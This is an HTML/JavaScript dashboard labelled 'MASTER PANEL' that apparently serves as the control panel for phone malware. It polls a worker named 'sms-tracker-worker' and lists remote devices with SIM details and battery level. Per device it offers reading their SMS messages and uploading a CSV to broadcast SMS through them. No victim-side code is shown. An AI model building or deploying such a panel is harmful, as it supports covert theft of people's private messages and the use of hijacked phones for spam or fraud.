<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Command Center</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <style>
        :root {
            --bg: #0a0a0b; --card: #161618; --green: #00ff88; --red: #ff3366;
            --blue: #00ccff; --pink: #ff00ff; --yellow: #ffcc00; --glass: rgba(255,255,255,0.05);
        }
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background: var(--bg); color: #fff; margin: 0; padding: 20px; }
        
        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: var(--glass); border-radius: 15px; border: 1px solid var(--blue); margin-bottom: 25px; }
        
        /* Device List Styling */
        .device-container { display: flex; flex-direction: column; gap: 15px; }
        .device-card { 
            background: var(--card); border-radius: 12px; padding: 15px; 
            display: flex; align-items: center; border: 1px solid #333;
            cursor: pointer; position: relative; overflow: hidden;
            transition: 0.3s;
        }
        .device-card:hover { transform: scale(1.02); border-color: var(--pink); }
        .serial-no { font-size: 1.2rem; font-weight: bold; color: var(--yellow); min-width: 40px; }
        .dev-info { flex-grow: 1; margin-left: 10px; }
        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        
        /* Popup / Modal */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; backdrop-filter: blur(8px); }
        .modal-content { background: #1a1a1c; width: 90%; max-width: 450px; margin: 15% auto; border-radius: 25px; padding: 20px; border: 2px solid var(--blue); position: relative; }
        .close-btn { position: absolute; top: 15px; right: 20px; font-size: 25px; color: var(--red); cursor: pointer; }

        /* Menu Grid inside Popup */
        .menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
        .menu-item { 
            background: #252529; padding: 20px; border-radius: 15px; text-align: center;
            border: 1px solid #444; transition: 0.3s;
        }
        .menu-item:active { transform: scale(0.9); }
        .menu-item i { font-size: 1.8rem; margin-bottom: 10px; display: block; }

        /* Custom Colors for Menu */
        .m-sms { border-bottom: 4px solid var(--blue); color: var(--blue); }
        .m-view { border-bottom: 4px solid var(--yellow); color: var(--yellow); }
        .m-user { border-bottom: 4px solid var(--pink); color: var(--pink); }
        .m-dev { border-bottom: 4px solid var(--green); color: var(--green); }

        .btn-action { width: 100%; padding: 12px; margin-top: 10px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="header">
        <div><h2 style="margin:0; color:var(--blue)">MASTER PANEL</h2><small style="color:var(--green)">Online Devices: <span id="onlineCount">0</span></small></div>
        <button onclick="fetchData()" style="background:none; border:1px solid var(--blue); color:var(--blue); padding:8px 15px; border-radius:10px;">REFRESH</button>
    </div>

    <div id="deviceContainer" class="device-container">
        <p style="text-align:center">Scanning for signals...</p>
    </div>

    <div id="menuModal" class="modal">
        <div class="modal-content">
            <span class="close-btn" onclick="closeModal('menuModal')">&times;</span>
            <h3 id="modalTitle" style="text-align:center; color:var(--blue)">Device Options</h3>
            <div class="menu-grid">
                <div class="menu-item m-sms" onclick="openSub('csvModal')"><i class="fas fa-file-csv"></i>Send SMS</div>
                <div class="menu-item m-view" onclick="openSub('viewSmsModal')"><i class="fas fa-envelope-open-text"></i>View SMS</div>
                <div class="menu-item m-user" onclick="alert('User Detail: ' + selectedDevice.sim_info)"><i class="fas fa-user-circle"></i>User Info</div>
                <div class="menu-item m-dev" onclick="alert('Brand: ' + selectedDevice.brand + '\nBattery: ' + selectedDevice.battery + '%')"><i class="fas fa-mobile-alt"></i>Device Info</div>
            </div>
        </div>
    </div>

    <div id="csvModal" class="modal">
        <div class="modal-content">
            <span class="close-btn" onclick="closeModal('csvModal')">&times;</span>
            <h3 style="color:var(--blue)">Upload CSV Broadcast</h3>
            <input type="file" id="csvFile" style="margin:20px 0; color:var(--yellow)">
            <button class="btn-action" style="background:var(--blue); color:black" onclick="alert('Broadcasting Started!')">START SENDING</button>
        </div>
    </div>

    <script>
        const WORKER_URL = 'https://sms-tracker-worker.vikash6759ub.workers.dev';
        let selectedDevice = null;

        async function fetchData() {
            try {
                const res = await fetch(`${WORKER_URL}/api/get-data`);
                let data = await res.json();
                
                // Sort Newest First (Assuming we add a timestamp or just reverse)
                data.reverse(); 

                const container = document.getElementById('deviceContainer');
                container.innerHTML = data.map((d, index) => {
                    const isOnline = true; // Isme logic daal sakte hain timestamp check karke
                    return `
                        <div class="device-card" onclick='openMenu(${JSON.stringify(d)})'>
                            <div class="serial-no">#${index + 1}</div>
                            <div class="dev-info">
                                <div style="font-weight:bold">${d.brand}</div>
                                <div style="font-size:0.8rem; color:#888">${d.sim_info}</div>
                            </div>
                            <div style="text-align:right">
                                <div style="color:${parseInt(d.battery) < 20 ? 'var(--red)' : 'var(--green)'}">${d.battery}% <i class="fas fa-battery-three-quarters"></i></div>
                                <div style="font-size:0.7rem"><span class="status-dot" style="background:var(--green)"></span> ONLINE</div>
                            </div>
                        </div>
                    `;
                }).join('');
                document.getElementById('onlineCount').innerText = data.length;
            } catch (e) { console.log(e); }
        }

        function openMenu(device) {
            selectedDevice = device;
            document.getElementById('modalTitle').innerText = device.brand;
            document.getElementById('menuModal').style.display = 'block';
        }

        function openSub(id) {
            closeModal('menuModal');
            document.getElementById(id).style.display = 'block';
        }

        function closeModal(id) { document.getElementById(id).style.display = 'none'; }

        fetchData();
        setInterval(fetchData, 15000); // 15 sec auto refresh
    </script>
</body>
</html>
